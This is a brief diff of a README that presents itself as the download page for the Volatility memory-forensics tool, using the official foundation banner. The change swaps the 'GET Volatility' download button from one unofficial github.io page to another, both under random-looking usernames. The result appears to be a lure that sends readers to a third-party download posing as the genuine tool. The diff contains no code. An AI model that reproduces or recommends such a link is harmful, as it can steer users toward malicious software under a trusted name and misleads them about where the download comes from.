@@ -2,7 +2,7 @@
 
 ![Banner Placeholder](https://volatilityfoundation.org/wp-content/uploads/2023/11/IMG_6305.png)
 
-[![GET Volatility](https://img.shields.io/badge/GET%20%E2%80%94%20Volatility-0078D6?style=for-the-badge&logoColor=white)](https://oscarnielsendsaj.github.io/.github/volatility)
+[![GET Volatility](https://img.shields.io/badge/GET%20%E2%80%94%20Volatility-0078D6?style=for-the-badge&logoColor=white)](https://denverahmedzifw.github.io/.github/volatility-download)
 
 ---
 
